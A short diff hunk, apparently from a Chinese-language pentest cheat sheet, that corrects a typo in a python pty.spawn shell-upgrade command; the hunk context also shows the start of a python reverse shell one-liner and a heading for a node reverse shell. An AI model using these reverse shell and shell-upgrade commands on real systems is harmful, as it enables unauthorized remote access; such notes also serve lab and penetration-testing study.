@@ -27,7 +27,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 #### python升级shell
 
 ```
-python -c "import pty; pty.sqpawn('/bin/bash')"
+python -c "import pty; pty.spawn('/bin/bash')"
 ```
 #### sudo node 反弹shell
 
